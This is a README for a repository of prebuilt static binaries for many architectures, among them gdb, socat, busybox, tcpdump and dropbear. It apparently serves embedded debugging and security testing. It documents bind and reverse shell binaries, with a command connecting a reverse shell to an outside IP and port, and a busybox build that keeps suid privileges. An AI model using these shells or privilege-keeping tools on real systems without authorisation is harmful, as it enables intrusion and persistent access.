# prebuilt-multiarch-bin

prebuilt binaries for multiple architeture (arm, armeb, aarch64, aarch64_be, mips, mips1, mipsel, mipsel1, mips64, mips64el, powerpc, powerpc64, powerpc64le, riscv64, i586, x86_64)

all binaries are statically linked and stripped

Please go to the [Release](https://github.com/leommxj/prebuilt-multiarch-bin/releases) page for download. `*archName*_tools.zip` contains tools' binary (see Tools Section) for that specific arch, and `allinone.zip` contains all of it.

Or download single file directly from `bin` branch

Source file and Scripts are in `src` branch

## Buildroot

* MIPS-I and MIPSEL-I are using `buildroot 2014.11` because they remove the support after that version
* others are using `buildroot 2019.11.1`
* compiled toolchain can be found at action's artifacts page (mips1/mipsel1 are file package from `output/host`, others are from `make sdk`)

## Tools

- gdb (mips1/mips1el are using `gdb 7.12.1`, others are `8.3.1`)
- socat
- busybox (And busybox_nodrop is the one replace all BB_SUID_DROP with BB_SUID_MAYBE, which means it will not drop suid in applets)
- bind/reverse shell
- bind/reverse shell .so library (barely tested)
- tcpdump
- strace
- dropbear(mips1/mips1el are not static link `:(` )
- lsof

## Bind/Reverse Shell binary

* run the bind shell without arguments like `./bind_shell` will listening on the port 3343 and `./bind_shell 6666` will listen on 6666.
* run the reverse shell binary without arguments will connect to 127.0.0.1:3343 , one could use a hex editor the change cstring cotains the ip/port. or `./reverse_shell 1.1.1.1 12345` will connect to 1.1.1.1:12345; `./reverse_shell 1.1.1.1` will connect to 1.1.1.1:3343

## gdb (*Important*)

- gdbserver is compiled without libthread_db
- gdb need libthread_db.so.1 to support multithread debug, if you run into SIGSEGV when `r` the program, run `set libthread-db-search-path 0` in gdb first, then there will be warning about libthread_db.so.1, just ignore it.

## Github Actions

the config file for buildroot and github actions' workflow file are in the `src` branch

## Changelog
* ~~20220514 - change to use release, old way can be found in `master_deprecated` branch~~ 20230305 - store files at `bin` branch with git lfs
* 20230217 - fix gdb build on x86_64
* 20230305 - enable telnetd applet and its stanalone mode in busybox
